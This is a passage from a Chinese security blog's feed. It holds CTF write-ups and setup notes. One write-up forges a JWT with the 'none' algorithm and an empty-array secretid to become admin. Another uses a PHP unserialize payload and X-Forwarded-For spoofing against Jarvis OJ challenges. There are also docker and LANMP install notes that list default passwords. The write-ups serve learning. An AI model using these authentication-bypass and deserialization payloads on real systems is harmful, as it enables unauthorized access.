punctuation">;</span></code></pre><p>重点代码如下：</p><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token string">'POST /api/register'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>username<span class="token punctuation">,</span> password<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'register error'</span><span class="token punctuation">,</span> <span class="token string">'wrong username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            token<span class="token punctuation">:</span> token        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span></code></pre><blockquote><p>在注册的时候（/api/register），接受传入的username和password，先判断username不为admin之后，然后生成一个key，用这些信息后再生成一个jwt的令牌，key同时存入全局数组</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token string">'POST /api/login'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>username<span class="token punctuation">,</span> password<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'username or password is necessary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> ctx<span class="token punctuation">.</span>header<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>authorization<span class="token punctuation">;</span>        <span class="token keyword">const</span> sid <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sid <span class="token operator">===</span> undefined <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'no such secret id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> status <span class="token operator">=</span> username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            status        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span></code></pre><blockquote><p>然后在登录的时候（/api/login），接受传入的username和password，从令牌的信息段里面取出key的id，从全局数组中取出key来进行验证，验证通过之后置session中的username为登录时的username</p></blockquote><p>获取flag时，假若用户为admin，则立刻给他flag</p><p>所以本题的解题过程就很清晰</p><p>一、注册</p><p>二、登录时成为admin</p><p>三、得到flag</p><p>已知：jwt令牌来进行信息存储，且使用的是jsonwebtoken库来进行操作，此处进行的是HS256加密</p><p>在webstorm里面</p><blockquote><p>当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过，这样很轻松地就可以伪造一个 username 为 admin 的 jwttoken 了。</p></blockquote><p>而且当两处都有密钥key的时候，会报错</p><pre><code>        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;        console.log(sid)        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &amp;#123;            throw new APIError('login error', 'no such secret id');        &amp;#125;        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, &amp;#123;algorithm: 'HS256'&amp;#125;);</code></pre><p>接着返回源代码程序中，需要修改 secretid，使其无法作为全局变量secrets数组的索引—&gt;secret则会自动置空</p><blockquote><p>注意，这里还有一个验证，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。乍看之下没有操作空间，怎么整都会取出 密钥 key。但别忘了 JavaScript 是一门弱类型语言，NodeJS 都是 JS 的语法，那自然也是咯。所以我们只要选择恰当的数据来绕过这个判断即可。</p></blockquote><p>空数组/空字符串与数字比较永远为真</p><p>参考赵师傅的代码：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span>token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>secretid<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> username<span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span> password<span class="token punctuation">:</span><span class="token string">"123456"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span> undefined<span class="token punctuation">,</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>algorithm<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span></code></pre><p>生成一个 secretid 为空数组的令牌，username 设为admin，加密方式为 none（设为none的话会自动用HS256），绕过验证，使得最后登录时验证的用户名为 admin</p><blockquote><pre><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU4NzMwMjYxN30.</code></pre></blockquote><p>接着注册就初始化全局变量 secrets 数组</p><p>然后登录的时候记得在bp里面改username为admin，然后用上面的payload改token（Authorization），bp的response里面就即可出现flag</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>审计</p><p>jwt生成</p><p>js的弱类型比较</p><blockquote><p>一盘青梅，一壶清茶，聊聊web？</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> HFCTF-Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HFCTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭题</title>
      <link href="/2020/05/23/da-ti/"/>
      <url>/2020/05/23/da-ti/</url>
      
        <content type="html"><![CDATA[<p>最近真的是特别惨，一边出题一边打比赛，而且最近实验室招新，还是记录一下比较好，防止后面忘记了</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>关于docker的话：参考实验室的<a href="https://xi4or0uji.github.io/2019/02/19/%E7%94%A8docker%E6%90%AD%E4%B8%AActf%E9%A2%98%E7%9B%AE/">肉鸡大佬的博客</a>弄的：</p><p>言归正传，docker可以理解成在服务器上的虚拟机，里面的容器互不干扰，然后不容易相互窜。</p><p>First 找lamp环境</p><p><code>docker search lamp</code></p><p>Second 拉镜像（此处用的是tutum的lamp）</p><p><code>docker pull tutum/lamp</code></p><a id="more"></a><p>Third 检查本地镜像</p><p><code>docker images</code></p><p>Fourth 建立docker容器</p><p><code>docker run -d -p 2333:80 -p 3308:3306 tutum/lamp</code></p><p>Fifth 查看已有的容器</p><p><code>docker ps -a</code></p><p>然后去访问自己的服务器的地址+:+2333查看是否映射成功</p><p>Sixth  部署题目</p><p><code>docker cp 文件夹路径  container_id:/var/www/html</code></p><p>这样子就一套操作下来就好啦</p><pre><code>#拉镜像docker pull [image]#查看当前镜像docker images#新建容器docker run -d -p [host port]:[docker port] [image]#查看容器docker ps -a#拷贝文件docker cp [outfile] [container id]:[infile]#进去容器docker exec -it [container id] bash#启动容器docker start [container id]#停止容器docker stop [container id]#删除容器(注意要关了容器才能删)docker rm [container id]</code></pre><p>温馨提示一下，一般都是要加上sudo在最前面来告诉服务器权限高了。</p><h2 id="PHP与HTML的二三事"><a href="#PHP与HTML的二三事" class="headerlink" title="PHP与HTML的二三事"></a>PHP与HTML的二三事</h2><p>惨兮兮的我好久没看PHP+HTML的代码，然后忘记了，顺便一起</p><p>在PHP中添加HTML代码有三种方式：</p><p>一、在很长的HTML代码中，需要有PHP语言执行的时候插入   &lt; ?php…. ?&gt;</p><p>例如：</p><pre class=" language-php+HTML"><code class="language-php+HTML">< html >< ?php echo "厉害了"; ?>< /html ></code></pre><p>二、用echo语句输出HTML的语句</p><p>例如：</p><pre class=" language-php+HTML"><code class="language-php+HTML"><?phpecho "You can really dance";echo "< br >";?></code></pre><p>有的时候HTML语句中也有双引号，echo语句可以用单引号来展开或者在HTML语言中用到转译字符” \ “</p><p>三、 用（&lt;&lt;&lt;）标记符     在PHP168的模板代码中首次见到。 </p><p>适用于在PHP中有大段大段的HTML的代码输出，具体方法见PHP简单的介绍</p><h2 id="HTML的一些杂七杂八"><a href="#HTML的一些杂七杂八" class="headerlink" title="HTML的一些杂七杂八"></a>HTML的一些杂七杂八</h2><p> 1.<embed> 标签定义了一个容器，用来嵌入外部应用或者互动程序（插件）。 </p><p>有四个参数：height，src（ 规定被嵌入内容的 URL），type（ 规定嵌入内容的 MIME 类型。<br>注：MIME = Multipurpose Internet Mail Extensions），width</p><p>2.html中怎么实现<a href="https://zhidao.baidu.com/question/1924712712525017707.html">自动播放视频与音乐文件</a>？</p><p> 背景音乐代码 <code>&lt;embed src="文件路径" width=170 height=25 loop="true" autostart="true"&gt;</code> </p><p>3.php如何自动刷新页面</p><p>在index.php中，输入代码：<code>echo ("setTimeout('window.location.reload()', 1);");</code> </p><p>4.[php 删除cookie有效方法]</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 搭题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CenteOS 零基础安装 PHP + MySQL</title>
      <link href="/2020/02/16/centeos-ling-ji-chu-an-zhuang-php-mysql/"/>
      <url>/2020/02/16/centeos-ling-ji-chu-an-zhuang-php-mysql/</url>
      
        <content type="html"><![CDATA[<h3 id="快速搭建-PHP-MySQL"><a href="#快速搭建-PHP-MySQL" class="headerlink" title="快速搭建 PHP + MySQL"></a>快速搭建 PHP + MySQL</h3><p><strong>下载安装软件</strong></p><pre><code>wget http://dl.wdlinux.cn/lanmp_laster.tar.gz</code></pre><p>解压</p><pre><code>tar zxvf lanmp_laster.tar.gz</code></pre><p><strong>安装</strong></p><pre><code>sh lanmp.sh</code></pre><p>运行之后会出现后面这个界面：</p><p><img src="1.png"></p><p>可以选择自己需要的，如果不清楚自己需要什么，目的就想要安装 Discuz，Wordpress 等一系列 PHP 软件，那么选择4，按回车就可以了。</p><ul><li>这个过程可能有点长，但是可以稍作等待。根据机器性能和配置，一般可能要等待10-50分钟不等。</li><li>如果您觉得这个时间太久，您可以出去喝一杯咖啡哦。</li></ul><p>安装成功：</p><p><img src="2.png"></p><p><strong>熟悉软件</strong></p><p>默认的后台管理地址如下：</p><pre><code>http://ip:8080</code></pre><p>实验室地址查看方法：</p><p><img src="3.png"></p><p>后台管理用户名:</p><pre><code>admin</code></pre><p>后台管理默认密码:</p><pre><code>wdlinux.cn</code></pre><p>MySQL 默认的管理用户名:</p><pre><code>root</code></pre><p>MySQL 默认密码:</p><pre><code>wdlinux.cn</code></pre><p>例如我的实验室环境提示的 IP 地址是：111.230.16.184 则我的登录地址是：</p><pre><code>http://111.230.16.184:8080</code></pre><p><img src="4.png"></p><p>输入默认的管理账号密码： 后台管理用户名:</p><pre><code>admin</code></pre><p>后台管理默认密码:</p><pre><code>wdlinux.cn</code></pre><p>登陆之后可以快速修改自己的默认账号密码。</p><p>这里强烈建议数据库账号密码和后台管理账号密码第一时间进行修改！</p><p>后续的网址：明天继续</p><p><a href="https://cloud.tencent.com/developer/labs/lab/10397">https://cloud.tencent.com/developer/labs/lab/10397</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis web 持续更新</title>
      <link href="/2019/11/12/jarvis-web-chi-xu-geng-xin/"/>
      <url>/2019/11/12/jarvis-web-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<h2 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h2><p><img src="1.PNG"></p><p>直接在虚拟机上用curl +URL + –local-port 51就可以了</p><h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>一上来就知道是本地访问，改请求头里面的X-Forwarded-For：127.0.0.1即可</p><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>首先进入到界面是一张普普通通的图片，接着查看源代码是 “<a href="http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==">showimg.php?img=c2hpZWxkLmpwZw==</a>“ </p><p>emmmmmmm这个是一个提示吧，那我就试一下</p><p>接着就发现了img后面接着的是base64的编码，那么可以尝试读取index.php的base64编码后的东西、</p><p>首先是空白的界面，尝试查看源代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'shield.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>然后发现有’shield.php’，尝试读取’shield.php’的内容，同读取index.php一样base64转码出来</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//flag is in pctf.php</span>    <span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> file <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>尝试一下读取pctf.php的东西发现过滤了，那么就好好的把之前的源码连起来审计一下吧。</p><p>审计后发现可以利用shield类里面没有进行过滤，于是可以利用反序列化，构造一个shield类，然后把pctf.php反序列化</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> file <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">function</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span>              <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>     <span class="token variable">$shield</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token string">'pctf.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$shield</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>然后输入payload：<a href="http://web.jarvisoj.com:32768/?class=O:6:%22Shield%22:1:%7Bs:4:%22file%22;s:8:%22pctf.php%22;%7D">http://web.jarvisoj.com:32768/?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</a></p><p>即可</p><h3 id="本题考察知识点"><a href="#本题考察知识点" class="headerlink" title="本题考察知识点"></a>本题考察知识点</h3><p>文件包含漏洞：</p><p>反序列化漏洞：</p><h2 id="IN-A-MESS"><a href="#IN-A-MESS" class="headerlink" title="IN A MESS"></a>IN A MESS</h2><p>首先进入界面的时候只有work harder！…这些东西，好像没有啥的，然后看了看URL，里面有个id = 1，猜测是不是注入的问题…后面发现没有别的东西…</p><p>然后菜鸡就去尝试了抓包发现有提示在index.phps里面（害，还是太菜了）</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;!--index.phps-->"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: index.php?id=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">'Hahahahahaha'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">==</span><span class="token string">"1112 is a nice lab!"</span> <span class="token keyword">and</span> <span class="token variable">$id</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token 